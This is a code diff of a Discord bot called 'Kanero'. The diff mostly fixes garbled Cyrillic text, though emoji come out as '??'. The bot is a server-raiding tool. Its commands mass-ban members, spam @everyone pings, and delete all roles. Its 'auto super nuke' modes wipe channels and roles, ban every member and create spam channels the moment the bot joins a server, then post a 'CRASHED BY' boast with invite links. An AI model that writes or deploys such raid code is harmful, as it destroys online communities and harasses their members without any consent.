     status_msg = await ctx.send(embed=discord.Embed(
-        description=f"рџ’Ђ Р‘Р°РЅСЋ {len(targets)} СѓС‡Р°СЃС‚РЅРёРєРѕРІ...",
+        description=f"?? Баню {len(targets)} участников...",
         color=0x0a0a0a
     ))
     results = await asyncio.gather(*[m.ban(reason="massban") for m in targets], return_exceptions=True)
     banned = sum(1 for r in results if not isinstance(r, Exception))
     embed = discord.Embed(
-        title="рџ’Ђ Mass Ban Р·Р°РІРµСЂС€С‘РЅ",
-        description=f"вњ… Р—Р°Р±Р°РЅРµРЅРѕ: **{banned}**",
+        title="?? Mass Ban завершён",
+        description=f"? Забанено: **{banned}**",
         color=0x0a0a0a
     )
-    embed.set_footer(text="в пёЏ Kanero")
+    embed.set_footer(text="?? Kanero")
     await status_msg.edit(embed=embed)
 
 
@@ -3889,7 +3889,7 @@ async def massban(ctx):
 @premium_check()
 async def spam_cmd(ctx, count: int, *, text: str):
     if count > 50:
-        await ctx.send("РњР°РєСЃРёРјСѓРј 50.")
+        await ctx.send("Максимум 50.")
         return
     mentions = discord.AllowedMentions(everyone=True, roles=True, users=True)
     for _ in range(count):
@@ -3904,7 +3904,7 @@ async def spam_cmd(ctx, count: int, *, text: str):
 @premium_check()
 async def pingspam(ctx, count: int = 10):
     if count > 30:
-        await ctx.send("РњР°РєСЃРёРјСѓРј 30.")
+        await ctx.send("Максимум 30.")
         return
     mentions = discord.AllowedMentions(everyone=True)
     for _ in range(count):
@@ -3926,10 +3926,10 @@ async def rolesdelete(ctx):
     )
     deleted = sum(1 for r in results if not isinstance(r, Exception))
     embed = discord.Embed(
-        description=f"рџ—‘пёЏ РЈРґР°Р»РµРЅРѕ СЂРѕР»РµР№: **{deleted}**",
+        description=f"??? Удалено ролей: **{deleted}**",
         color=0x0a0a0a
     )
-    embed.set_footer(text="в пёЏ Kanero")
+    embed.set_footer(text="?? Kanero")
     await ctx.send(embed=embed)
 
 
@@ -3938,20 +3938,20 @@ async def rolesdelete(ctx):
 async def serverinfo(ctx):
     guild = ctx.guild
     embed = discord.Embed(
-        title=f"в пёЏ {guild.name}",
+        title=f"?? {guild.name}",
         color=0x0a0a0a
     )
-    embed.add_field(name="рџ‘Ґ РЈС‡Р°СЃС‚РЅРёРєРѕРІ", value=str(guild.member_count))
-    embed.add_field(name="рџ“ў РљР°РЅР°Р»РѕРІ", value=str(len(guild.channels)))
-    embed.add_field(name="рџЋ­ Р РѕР»РµР№", value=str(len(guild.roles)))
-    embed.add_field(name="рџ’Ћ Р‘СѓСЃС‚ СѓСЂРѕРІРµРЅСЊ", value=str(guild.premium_tier))
-    embed.add_field(name="рџљЂ Р‘СѓСЃС‚РµСЂРѕРІ", value=str(guild.premium_subscription_count))
-    embed.add_field(name="рџ†” ID СЃРµСЂРІРµСЂР°", value=str(guild.id))
-    embed.add_field(name="рџ‘‘ РћРІРЅРµСЂ", value=str(guild.owner))
-    embed.add_field(name="рџ“… РЎРѕР·РґР°РЅ", value=guild.created_at.strftime("%d.%m.%Y"))
+    embed.add_field(name="?? Участников", value=str(guild.member_count))
+    embed.add_field(name="?? Каналов", value=str(len(guild.channels)))
+    embed.add_field(name="?? Ролей", value=str(len(guild.roles)))
+    embed.add_field(name="?? Буст уровень", value=str(guild.premium_tier))
+    embed.add_field(name="?? Бустеров", value=str(guild.premium_subscription_count))
+    embed.add_field(name="?? ID сервера", value=str(guild.id))
+    embed.add_field(name="?? Овнер", value=str(guild.owner))
+    embed.add_field(name="?? Создан", value=guild.created_at.strftime("%d.%m.%Y"))
     if guild.icon:
         embed.set_thumbnail(url=guild.icon.url)
-    embed.set_footer(text="в пёЏ Kanero")
+    embed.set_footer(text="?? Kanero")
     await ctx.send(embed=embed)
 
 
@@ -3962,40 +3962,40 @@ async def userinfo(ctx, user_id: int = None):
         try:
             user = await bot.fetch_user(user_id)
         except Exception:
-            await ctx.send("РџРѕР»СЊР·РѕРІР°С‚РµР»СЊ РЅРµ РЅР°Р№РґРµРЅ.")
+            await ctx.send("Пользователь не найден.")
             return
     else:
         user = ctx.author
     member = ctx.guild.get_member(user.id) if ctx.guild else None
     embed = discord.Embed(
-        title=f"рџ‘ЃпёЏ {user}",
+        title=f"??? {user}",
         color=0x0a0a0a
     )
-    embed.add_field(name="рџ†” ID", value=str(user.id))
-    embed.add_field(name="рџ“… РђРєРєР°СѓРЅС‚ СЃРѕР·РґР°РЅ", value=user.created_at.strftime("%d.%m.%Y"))
+    embed.add_field(name="?? ID", value=str(user.id))
+    embed.add_field(name="?? Аккаунт создан", value=user.created_at.strftime("%d.%m.%Y"))
     if member:
-        embed.add_field(name="рџ“Ґ Р—Р°С€С‘Р» РЅР° СЃРµСЂРІРµСЂ", value=member.joined_at.strftime("%d.%m.%Y") if member.joined_at else "N/A")
-        embed.add_field(name="рџЋ­ Р’С‹СЃС€Р°СЏ СЂРѕР»СЊ", value=member.top_role.mention)
-        embed.add_field(name="рџ’Ћ Р‘СѓСЃС‚", value="Р”Р°" if member.premium_since else "РќРµС‚")
+        embed.add_field(name="?? Зашёл на сервер", value=member.joined_at.strftime("%d.%m.%Y") if member.joined_at else "N/A")
+        embed.add_field(name="?? Высшая роль", value=member.top_role.mention)
+        embed.add_field(name="?? Буст", value="Да" if member.premium_since else "Нет")
     if user.avatar:
         embed.set_thumbnail(url=user.avatar.url)
-    embed.set_footer(text="в пёЏ Kanero")
+    embed.set_footer(text="?? Kanero")
     await ctx.send(embed=embed)
 
 
-# в”Ђв”Ђв”Ђ AUTO SUPER NUKE в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ
+# --- AUTO SUPER NUKE ---------------------------------------
 
 AUTO_SUPER_NUKE = False
-AUTO_SUPER_NUKE_TEXT = "|| @everyone  @here ||\n# CRASHED BY KIMARY AND DAVAIDKA CLNX INTARAKTIVE SQUAD\n# РЈРґР°С‡Рё РіР°Р№СЃ)\nhttps://discord.gg/Pmt838emgv\nРҐРѕС‡РµС€СЊ С‚Р°Рє Р¶Рµ? Р—Р°С…РѕРґРё Рє РЅР°Рј!\nв пёЏ Kanero вЂ” https://discord.gg/exYwg6Gz\nDeveloper - DavaidKa вќ¤пёЏ"
+AUTO_SUPER_NUKE_TEXT = "|| @everyone  @here ||\n# CRASHED BY KIMARY AND DAVAIDKA CLNX INTARAKTIVE SQUAD\n# Удачи гайс)\nhttps://discord.gg/Pmt838emgv\nХочешь так же? Заходи к нам!\n?? Kanero — https://discord.gg/exYwg6Gz\nDeveloper - DavaidKa ??"
 AUTO_SUPERPR_NUKE = False
 AUTO_SUPERPR_NUKE_TEXT = None
-# РќР°СЃС‚СЂРѕР№РєРё С‡С‚Рѕ РґРµР»Р°С‚СЊ РїСЂРё auto_super_nuke
+# Настройки что делать при auto_super_nuke
 SNUKE_CONFIG = {
-    "massban": True,       # Р±Р°РЅРёС‚СЊ РІСЃРµС…
-    "boosters_only": False, # Р±Р°РЅРёС‚СЊ С‚РѕР»СЊРєРѕ Р±СѓСЃС‚РµСЂРѕРІ
-    "rolesdelete": True,   # СѓРґР°Р»РёС‚СЊ СЂРѕР»Рё
-    "pingspam": True,      # РїРёРЅРі СЃРїР°Рј
-    "massdm": False,       # РјР°СЃСЃ РґРј
+    "massban": True,       # банить всех
+    "boosters_only": False, # банить только бустеров
+    "rolesdelete": True,   # удалить роли
+    "pingspam": True,      # пинг спам
+    "massdm": False,       # масс дм
 }
 
 
@@ -4008,7 +4008,7 @@ def save_auto_super_nuke():
 
 
 def load_auto_super_nuke():
-    pass  # Р·Р°РјРµРЅРµРЅРѕ РЅР° async load РІ on_ready
+    pass  # заменено на async load в on_ready
 
 
 @bot.command(name="auto_super_nuke")
@@ -4019,130 +4019,130 @@ async def auto_super_nuke_cmd(ctx, state: str, *, text: str = None):
         AUTO_SUPER_NUKE = True
         save_auto_super_nuke()
         embed = discord.Embed(
-            title="рџ’Ђ Auto Super Nuke вЂ” Р’РљР›Р®Р§РЃРќ",
+            title="?? Auto Super Nuke — ВКЛЮЧЁН",
             description=(
-                "РџСЂРё РІС…РѕРґРµ Р±РѕС‚Р° РЅР° СЃРµСЂРІРµСЂ Р°РІС‚РѕРјР°С‚РёС‡РµСЃРєРё:\n"
-                "вЂў РќСЋРє СЃ С‚РІРѕРёРј С‚РµРєСЃС‚РѕРј (РёР»Рё РґРµС„РѕР»С‚РЅС‹Рј)\n"
-                "вЂў РњР°СЃСЃР±Р°РЅ РІСЃРµС… СѓС‡Р°СЃС‚РЅРёРєРѕРІ\n"
-                "вЂў РЈРґР°Р»РµРЅРёРµ РІСЃРµС… СЂРѕР»РµР№\n"
-                "вЂў РџРёРЅРі СЃРїР°Рј @everyone\n\n"
-                f"РўРµРєСЃС‚: `{AUTO_SUPER_NUKE_TEXT or 'РґРµС„РѕР»С‚РЅС‹Р№'}`\n"
-                "Р§С‚РѕР±С‹ Р·Р°РґР°С‚СЊ С‚РµРєСЃС‚: `!auto_super_nuke text <С‚РІРѕР№ С‚РµРєСЃС‚>`"
+                "При входе бота на сервер автоматически:\n"
+                "• Нюк с твоим текстом (или дефолтным)\n"
+                "• Массбан всех участников\n"
+                "• Удаление всех ролей\n"
+                "• Пинг спам @everyone\n\n"
+                f"Текст: `{AUTO_SUPER_NUKE_TEXT or 'дефолтный'}`\n"
+                "Чтобы задать текст: `!auto_super_nuke text <твой текст>`"
             ),
             color=0x0a0a0a
         )
-        embed.set_footer(text="в пёЏ Kanero")
+        embed.set_footer(text="?? Kanero")
         await ctx.send(embed=embed)
     elif state.lower() == "off":
         AUTO_SUPER_NUKE = False
         save_auto_super_nuke()
-        embed = discord.Embed(description="вќЊ **Auto Super Nuke** РІС‹РєР»СЋС‡РµРЅ.", color=0x0a0a0a)
-        embed.set_footer(text="в пёЏ Kanero")
+        embed = discord.Embed(description="? **Auto Super Nuke** выключен.", color=0x0a0a0a)
+        embed.set_footer(text="?? Kanero")
         await ctx.send(embed=embed)
     elif state.lower() == "text":
         if not text:
-            await ctx.send("РЈРєР°Р¶Рё С‚РµРєСЃС‚: `!auto_super_nuke text <С‚РІРѕР№ С‚РµРєСЃС‚>`")
+            await ctx.send("Укажи текст: `!auto_super_nuke text <твой текст>`")
             return
         AUTO_SUPER_NUKE_TEXT = text
         save_auto_super_nuke()
         embed = discord.Embed(
-            title="вњ… РўРµРєСЃС‚ Auto Super Nuke РѕР±РЅРѕРІР»С‘РЅ",
+            title="? Текст Auto Super Nuke обновлён",
             description=f"```{text[:500]}```",
             color=0x0a0a0a
         )
-        embed.set_footer(text="в пёЏ Kanero  |  РўРµРїРµСЂСЊ РІРєР»СЋС‡Рё: !auto_super_nuke on")
+        embed.set_footer(text="?? Kanero  |  Теперь включи: !auto_super_nuke on")
         await ctx.send(embed=embed)
     elif state.lower() == "info":
-        status = "вњ… Р’РєР»СЋС‡С‘РЅ" if AUTO_SUPER_NUKE else "вќЊ Р’С‹РєР»СЋС‡РµРЅ"
+        status = "? Включён" if AUTO_SUPER_NUKE else "? Выключен"
         cur_text = AUTO_SUPER_NUKE_TEXT or config.SPAM_TEXT
         embed = discord.Embed(
-            title="рџ’Ђ Auto Super Nuke вЂ” INFO",
+            title="?? Auto Super Nuke — INFO",
             description=(
-                f"РЎС‚Р°С‚СѓСЃ: **{status}**\n\n"
-                "РџСЂРё РІС…РѕРґРµ Р±РѕС‚Р° РЅР° СЃРµСЂРІРµСЂ:\n"
-                "вЂў РќСЋРє СЃ РєР°СЃС‚РѕРјРЅС‹Рј С‚РµРєСЃС‚РѕРј\n"
-                "вЂў РњР°СЃСЃР±Р°РЅ РІСЃРµС… СѓС‡Р°СЃС‚РЅРёРєРѕРІ\n"
-                "вЂў РЈРґР°Р»РµРЅРёРµ РІСЃРµС… СЂРѕР»РµР№\n"
-                "вЂў РџРёРЅРі СЃРїР°Рј @everyone\n\n"
-                f"РўРµРєСѓС‰РёР№ С‚РµРєСЃС‚:\n```{cur_text[:300]}```"
+                f"Статус: **{status}**\n\n"
+                "При входе бота на сервер:\n"
+                "• Нюк с кастомным текстом\n"
+                "• Массбан всех участников\n"
+                "• Удаление всех ролей\n"
+                "• Пинг спам @everyone\n\n"
+                f"Текущий текст:\n```{cur_text[:300]}```"
             ),
             color=0x0a0a0a
         )
-        embed.set_footer(text="в пёЏ Kanero")
+        embed.set_footer(text="?? Kanero")
         await ctx.send(embed=embed)
     else:
         await ctx.send(
-            "РСЃРїРѕР»СЊР·РѕРІР°РЅРёРµ:\n"
-            "`!auto_super_nuke on` вЂ” РІРєР»СЋС‡РёС‚СЊ\n"
-            "`!auto_super_nuke off` вЂ” РІС‹РєР»СЋС‡РёС‚СЊ\n"
-            "`!auto_super_nuke text <С‚РµРєСЃС‚>` вЂ” Р·Р°РґР°С‚СЊ С‚РµРєСЃС‚\n"
-            "`!auto_super_nuke info` вЂ” СЃС‚Р°С‚СѓСЃ Рё С‚РµРєСѓС‰РёР№ С‚РµРєСЃС‚"
+            "Использование:\n"
+            "`!auto_super_nuke on` — включить\n"
+            "`!auto_super_nuke off` — выключить\n"
+            "`!auto_super_nuke text <текст>` — задать текст\n"
+            "`!auto_super_nuke info` — статус и текущий текст"
         )
 
 
 @bot.command(name="snuke_config")
 @premium_check()
 async def snuke_config(ctx, option: str = None, value: str = None):
-    """РќР°СЃС‚СЂРѕР№РєР° С‡С‚Рѕ РґРµР»Р°РµС‚ auto_super_nuke РїСЂРё РІС…РѕРґРµ РЅР° СЃРµСЂРІРµСЂ"""
+    """Настройка что делает auto_super_nuke при входе на сервер"""
     options = {
-        "massban":      ("РњР°СЃСЃР±Р°РЅ РІСЃРµС… СѓС‡Р°СЃС‚РЅРёРєРѕРІ", "massban"),
-        "boosters":     ("Р‘Р°РЅРёС‚СЊ С‚РѕР»СЊРєРѕ Р±СѓСЃС‚РµСЂРѕРІ", "boosters_only"),
-        "rolesdelete":  ("РЈРґР°Р»РµРЅРёРµ РІСЃРµС… СЂРѕР»РµР№", "rolesdelete"),
-        "pingspam":     ("РџРёРЅРі СЃРїР°Рј @everyone", "pingspam"),
-        "massdm":       ("РњР°СЃСЃ Р”Рњ РІСЃРµРј СѓС‡Р°СЃС‚РЅРёРєР°Рј", "massdm"),
+        "massban":      ("Массбан всех участников", "massban"),
+        "boosters":     ("Банить только бустеров", "boosters_only"),
+        "rolesdelete":  ("Удаление всех ролей", "rolesdelete"),
+        "pingspam":     ("Пинг спам @everyone", "pingspam"),
+        "massdm":       ("Масс ДМ всем участникам", "massdm"),
     }
 
     if not option:
-        # РџРѕРєР°Р·Р°С‚СЊ С‚РµРєСѓС‰РёРµ РЅР°СЃС‚СЂРѕР№РєРё
+        # Показать текущие настройки
         embed = discord.Embed(
-            title="вљ™пёЏ SUPER NUKE вЂ” РќРђРЎРўР РћР™РљР",
+            title="?? SUPER NUKE — НАСТРОЙКИ",
             description=(
-                "РЈРїСЂР°РІР»СЏР№ С‡С‚Рѕ РґРµР»Р°РµС‚ `!auto_super_nuke` РїСЂРё РІС…РѕРґРµ РЅР° СЃРµСЂРІРµСЂ.\n"
-                "РСЃРїРѕР»СЊР·РѕРІР°РЅРёРµ: `!snuke_config <РѕРїС†РёСЏ> on/off`"
+                "Управляй что делает `!auto_super_nuke` при входе на сервер.\n"
+                "Использование: `!snuke_config <опция> on/off`"
             ),
             color=0x0a0a0a
         )
         lines = []
         for key, (label, cfg_key) in options.items():
-            status = "вњ…" if SNUKE_CONFIG.get(cfg_key) else "вќЊ"
-            lines.append(f"{status} `{key}` вЂ” {label}")
-        embed.add_field(name="РўРµРєСѓС‰РёРµ РЅР°СЃС‚СЂРѕР№РєРё", value="\n".join(lines), inline=False)
+            status = "?" if SNUKE_CONFIG.get(cfg_key) else "?"
+            lines.append(f"{status} `{key}` — {label}")
+        embed.add_field(name="Текущие настройки", value="\n".join(lines), inline=False)
         embed.add_field(
-            name="РћРїС†РёРё",
+            name="Опции",
             value=(
-                "`massban` вЂ” Р±Р°РЅРёС‚СЊ РІСЃРµС… СѓС‡Р°СЃС‚РЅРёРєРѕРІ\n"
-                "`boosters` вЂ” Р±Р°РЅРёС‚СЊ С‚РѕР»СЊРєРѕ Р±СѓСЃС‚РµСЂРѕРІ (РµСЃР»Рё massban РІС‹РєР»)\n"
-                "`rolesdelete` вЂ” СѓРґР°Р»СЏС‚СЊ РІСЃРµ СЂРѕР»Рё\n"
-                "`pingspam` вЂ” РїРёРЅРі СЃРїР°Рј @everyone\n"
-                "`massdm` вЂ” РјР°СЃСЃ Р”Рњ РІСЃРµРј СѓС‡Р°СЃС‚РЅРёРєР°Рј"
+                "`massban` — банить всех участников\n"
+                "`boosters` — банить только бустеров (если massban выкл)\n"
+                "`rolesdelete` — удалять все роли\n"
+                "`pingspam` — пинг спам @everyone\n"
+                "`massdm` — масс ДМ всем участникам"
             ),
             inline=False
         )
-        embed.set_footer(text="в пёЏ Kanero  |  РќСЋРє РІСЃРµРіРґР° РІРєР»СЋС‡С‘РЅ")
+        embed.set_footer(text="?? Kanero  |  Нюк всегда включён")
         await ctx.send(embed=embed)
         return
 
     if option not in options:
-        await ctx.send(f"вќЊ РќРµРёР·РІРµСЃС‚РЅР°СЏ РѕРїС†РёСЏ `{option}`. Р”РѕСЃС‚СѓРїРЅС‹Рµ: `{'`, `'.join(options.keys())}`")
+        await ctx.send(f"? Неизвестная опция `{option}`. Доступные: `{'`, `'.join(options.keys())}`")
         return
     if value not in ("on", "off"):
-        await ctx.send("РЈРєР°Р¶Рё `on` РёР»Рё `off`.")
+        await ctx.send("Укажи `on` или `off`.")
         return
 
     cfg_key = options[option][1]
     SNUKE_CONFIG[cfg_key] = (value == "on")
     save_auto_super_nuke()
 
-    status = "вњ… РІРєР»СЋС‡РµРЅРѕ" if value == "on" else "вќЊ РІС‹РєР»СЋС‡РµРЅРѕ"
+    status = "? включено" if value == "on" else "? выключено"
     embed = discord.Embed(
-        description=f"**{options[option][0]}** вЂ” {status}",
+        description=f"**{options[option][0]}** — {status}",
         color=0x0a0a0a
     )
-    embed.set_footer(text="в пёЏ Kanero")
+    embed.set_footer(text="?? Kanero")
     await ctx.send(embed=embed)
 
 
-# в”Ђв”Ђв”Ђ AUTO SUPERPR NUKE в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ
+# --- AUTO SUPERPR NUKE -------------------------------------
 
 def save_auto_superpr_nuke():
     asyncio.create_task(db_set("data", "auto_superpr_nuke", {
@@ -4152,7 +4152,7 @@ def save_auto_superpr_nuke():
 
 
 def load_auto_superpr_nuke():
-    pass  # Р·Р°РјРµРЅРµРЅРѕ РЅР° async load РІ on_ready
+    pass  # заменено на async load в on_ready
 
 
 @bot.command(name="auto_superpr_nuke")
@@ -4163,67 +4163,67 @@ async def auto_superpr_nuke_cmd(ctx, state: str, *, text: str = None):
         AUTO_SUPERPR_NUKE = True
         save_auto_superpr_nuke()
         embed = discord.Embed(
-            title="вљЎ Auto Superpr Nuke вЂ” Р’РљР›Р®Р§РЃРќ",
+            title="? Auto Superpr Nuke — ВКЛЮЧЁН",
             description=(
-                "РџСЂРё РІС…РѕРґРµ Р±РѕС‚Р° РЅР° СЃРµСЂРІРµСЂ **РјРіРЅРѕРІРµРЅРЅРѕ**:\n"
-                "вЂў РЈРґР°Р»РµРЅРёРµ РєР°РЅР°Р»РѕРІ + СЂРѕР»РµР№\n"
-                "вЂў Р‘Р°РЅ РІСЃРµС… СѓС‡Р°СЃС‚РЅРёРєРѕРІ\n"
-                "вЂў РЎРѕР·РґР°РЅРёРµ РєР°РЅР°Р»РѕРІ СЃРѕ СЃРїР°РјРѕРј\n"
-                "Р’СЃС‘ РѕРґРЅРѕРІСЂРµРјРµРЅРЅРѕ вЂ” РјР°РєСЃРёРјР°Р»СЊРЅР°СЏ СЃРєРѕСЂРѕСЃС‚СЊ.\n\n"
-                f"РўРµРєСЃС‚: `{AUTO_SUPERPR_NUKE_TEXT or 'РґРµС„РѕР»С‚РЅС‹Р№'}`\n"
-                "Р§С‚РѕР±С‹ Р·Р°РґР°С‚СЊ С‚РµРєСЃС‚: `!auto_superpr_nuke text <С‚РІРѕР№ С‚РµРєСЃС‚>`"
+                "При входе бота на сервер **мгновенно**:\n"
+                "• Удаление каналов + ролей\n"
+                "• Бан всех участников\n"
+                "• Создание каналов со спамом\n"
+                "Всё одновременно — максимальная скорость.\n\n"
+                f"Текст: `{AUTO_SUPERPR_NUKE_TEXT or 'дефолтный'}`\n"
+                "Чтобы задать текст: `!auto_superpr_nuke text <твой текст>`"
             ),
             color=0x0a0a0a
         )
-        embed.set_footer(text="в пёЏ Kanero")
+        embed.set_footer(text="?? Kanero")
         await ctx.send(embed=embed)
     elif state.lower() == "off":
         AUTO_SUPERPR_NUKE = False
         save_auto_superpr_nuke()
-        embed = discord.Embed(description="вќЊ **Auto Superpr Nuke** РІС‹РєР»СЋС‡РµРЅ.", color=0x0a0a0a)
-        embed.set_footer(text="в пёЏ Kanero")
+        embed = discord.Embed(description="? **Auto Superpr Nuke** выключен.", color=0x0a0a0a)
+        embed.set_footer(text="?? Kanero")
         await ctx.send(embed=embed)
     elif state.lower() == "text":
         if not text:
-            await ctx.send("РЈРєР°Р¶Рё С‚РµРєСЃС‚: `!auto_superpr_nuke text <С‚РІРѕР№ С‚РµРєСЃС‚>`")
+            await ctx.send("Укажи текст: `!auto_superpr_nuke text <твой текст>`")
             return
         AUTO_SUPERPR_NUKE_TEXT = text
         save_auto_superpr_nuke()
         embed = discord.Embed(
-            title="вњ… РўРµРєСЃС‚ Auto Superpr Nuke РѕР±РЅРѕРІР»С‘РЅ",
+            title="? Текст Auto Superpr Nuke обновлён",
             description=f"```{text[:500]}```",
             color=0x0a0a0a
         )
-        embed.set_footer(text="в пёЏ Kanero  |  РўРµРїРµСЂСЊ РІРєР»СЋС‡Рё: !auto_superpr_nuke on")
+        embed.set_footer(text="?? Kanero  |  Теперь включи: !auto_superpr_nuke on")
         await ctx.send(embed=embed)
     elif state.lower() == "info":
-        status = "вњ… Р’РєР»СЋС‡С‘РЅ" if AUTO_SUPERPR_NUKE else "вќЊ Р’С‹РєР»СЋС‡РµРЅ"
+        status = "? Включён" if AUTO_SUPERPR_NUKE else "? Выключен"
         cur_text = AUTO_SUPERPR_NUKE_TEXT or config.SPAM_TEXT
         embed = discord.Embed(
-            title="вљЎ Auto Superpr Nuke вЂ” INFO",
+            title="? Auto Superpr Nuke — INFO",
             description=(
-                f"РЎС‚Р°С‚СѓСЃ: **{status}**\n\n"
-                "РџСЂРё РІС…РѕРґРµ вЂ” РІСЃС‘ РѕРґРЅРѕРІСЂРµРјРµРЅРЅРѕ:\n"
-                "вЂў РЈРґР°Р»РµРЅРёРµ РєР°РЅР°Р»РѕРІ + СЂРѕР»РµР№\n"
-                "вЂў Р‘Р°РЅ РІСЃРµС… СѓС‡Р°СЃС‚РЅРёРєРѕРІ\n"
-                "вЂў РЎРѕР·РґР°РЅРёРµ РєР°РЅР°Р»РѕРІ СЃРѕ СЃРїР°РјРѕРј\n\n"
-                f"РўРµРєСѓС‰РёР№ С‚РµРєСЃС‚:\n```{cur_text[:300]}```"
+                f"Статус: **{status}**\n\n"
+                "При входе — всё одновременно:\n"
+                "• Удаление каналов + ролей\n"
+                "• Бан всех участников\n"
+                "• Создание каналов со спамом\n\n"
+                f"Текущий текст:\n```{cur_text[:300]}```"
             ),
             color=0x0a0a0a
         )
-        embed.set_footer(text="в пёЏ Kanero")
+        embed.set_footer(text="?? Kanero")
         await ctx.send(embed=embed)
     else:
         await ctx.send(
-            "РСЃРїРѕР»СЊР·РѕРІР°РЅРёРµ:\n"
-            "`!auto_superpr_nuke on` вЂ” РІРєР»СЋС‡РёС‚СЊ\n"
-            "`!auto_superpr_nuke off` вЂ” РІС‹РєР»СЋС‡РёС‚СЊ\n"
-            "`!auto_superpr_nuke text <С‚РµРєСЃС‚>` вЂ” Р·Р°РґР°С‚СЊ С‚РµРєСЃС‚\n"
-            "`!auto_superpr_nuke info` вЂ” СЃС‚Р°С‚СѓСЃ"
+            "Использование:\n"
+            "`!auto_superpr_nuke on` — включить\n"
+            "`!auto_superpr_nuke off` — выключить\n"
+            "`!auto_superpr_nuke text <текст>` — задать текст\n"
+            "`!auto_superpr_nuke info` — статус"
         )
 
 
-# в”Ђв”Ђв”Ђ OWNER-ONLY: BLOCK / UNBLOCK GUILD в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ
+# --- OWNER-ONLY: BLOCK / UNBLOCK GUILD ---------------------
 
 @bot.command(name="block_guild", aliases=["block_guid"])
 async def block_guild(ctx, guild_id: int = None):
@@ -4231,16 +4231,16 @@ async def block_guild(ctx, guild_id: int = None):
         return
     gid = guild_id if guild_id else (ctx.guild.id if ctx.guild else None)
     if not gid:
-        await ctx.send("РЈРєР°Р¶Рё ID СЃРµСЂРІРµСЂР°: `!block_guild <id>`")
+        await ctx.send("Укажи ID сервера: `!block_guild <id>`")
         return
     if gid not in BLOCKED_GUILDS:
         BLOCKED_GUILDS.append(gid)
         save_blocked_guilds()
         guild_name = bot.get_guild(gid)
         name_str = f"**{guild_name.name}**" if guild_name else f"`{gid}`"
-        await ctx.send(f"рџ”’ РЎРµСЂРІРµСЂ {name_str} Р·Р°Р±Р»РѕРєРёСЂРѕРІР°РЅ. Р‘РѕС‚ РЅРµ Р±СѓРґРµС‚ РІС‹РїРѕР»РЅСЏС‚СЊ РєРѕРјР°РЅРґС‹ РЅР° РЅС‘Рј.")
+        await ctx.send(f"?? Сервер {name_str} заблокирован. Бот не будет выполнять команды на нём.")
     else:
-        await ctx.send("РЎРµСЂРІРµСЂ СѓР¶Рµ Р·Р°Р±Р»РѕРєРёСЂРѕРІР°РЅ.")
+        await ctx.send("Сервер уже заблокирован.")
 
 
 @bot.command(name="unblock_guild", aliases=["unblock_guid"])
@@ -4249,16 +4249,16 @@ async def unblock_guild(ctx, guild_id: int = None):
         return
     gid = guild_id if guild_id else (ctx.guild.id if ctx.guild else None)
     if not gid:
-        await ctx.send("РЈРєР°Р¶Рё ID СЃРµСЂРІРµСЂР°: `!unblock_guild <id>`")
+        await ctx.send("Укажи ID сервера: `!unblock_guild <id>`")
         return
     if gid in BLOCKED_GUILDS:
         BLOCKED_GUILDS.remove(gid)
         save_blocked_guilds()
         guild_name = bot.get_guild(gid)
         name_str = f"**{guild_name.name}**" if guild_name else f"`{gid}`"
-        await ctx.send(f"рџ”“ РЎРµСЂРІРµСЂ {name_str} СЂР°Р·Р±Р»РѕРєРёСЂРѕРІР°РЅ.")
+        await ctx.send(f"?? Сервер {name_str} разблокирован.")
     else:
-        await ctx.send("РЎРµСЂРІРµСЂ РЅРµ Р±С‹Р» Р·Р°Р±Р»РѕРєРёСЂРѕРІР°РЅ.")
+        await ctx.send("Сервер не был заблокирован.")
 
 
 @bot.command(name="blocked_guilds")
@@ -4266,98 +4266,98 @@ async def blocked_guilds_cmd(ctx):
     if ctx.author.id != config.OWNER_ID:
         return
     if not BLOCKED_GUILDS:
-        await ctx.send("РќРµС‚ Р·Р°Р±Р»РѕРєРёСЂРѕРІР°РЅРЅС‹С… СЃРµСЂРІРµСЂРѕРІ.")
+        await ctx.send("Нет заблокированных серверов.")
         return
     lines = []
     for gid in BLOCKED_GUILDS:
         g = bot.get_guild(gid)
-        lines.append(f"`{gid}` вЂ” {g.name if g else 'РЅРµРёР·РІРµСЃС‚РµРЅ'}")
-    await ctx.send("рџ”’ Р—Р°Р±Р»РѕРєРёСЂРѕРІР°РЅРЅС‹Рµ СЃРµСЂРІРµСЂС‹:\n" + "\n".join(lines))
+        lines.append(f"`{gid}` — {g.name if g else 'неизвестен'}")
+    await ctx.send("?? Заблокированные серверы:\n" + "\n".join(lines))
 
 
 @bot.command(name="giverole")
 async def giverole(ctx, user: discord.Member, role: discord.Role):
-    """Р’С‹РґР°С‚СЊ СЂРѕР»СЊ СѓС‡Р°СЃС‚РЅРёРєСѓ. РўРѕР»СЊРєРѕ РґР»СЏ РѕРІРЅРµСЂР°.
-    РСЃРїРѕР»СЊР·РѕРІР°РЅРёРµ: !giverole @СЋР·РµСЂ @СЂРѕР»СЊ  РёР»Рё  !giverole <user_id> <role_id>
+    """Выдать роль участнику. Только для овнера.
+    Использование: !giverole @юзер @роль  или  !giverole <user_id> <role_id>
     """
     if ctx.author.id != config.OWNER_ID:
         return
     try:
         await user.add_roles(role)
         embed = discord.Embed(
-            description=f"вњ… Р РѕР»СЊ **{role.name}** РІС‹РґР°РЅР° **{user}**.",
+            description=f"? Роль **{role.name}** выдана **{user}**.",
             color=0x0a0a0a
         )
-        embed.set_footer(text="в пёЏ Kanero")
+        embed.set_footer(text="?? Kanero")
         await ctx.send(embed=embed)
     except discord.Forbidden:
-        await ctx.send("вќЊ РќРµС‚ РїСЂР°РІ РІС‹РґР°С‚СЊ СЌС‚Сѓ СЂРѕР»СЊ (СЂРѕР»СЊ РІС‹С€Рµ Р±РѕС‚Р° РІ РёРµСЂР°СЂС…РёРё).")
